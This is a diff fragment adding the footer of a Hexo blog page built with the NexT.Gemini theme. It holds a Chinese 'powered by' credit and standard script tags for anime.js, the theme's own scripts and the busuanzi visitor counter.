+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</body>
+</html>
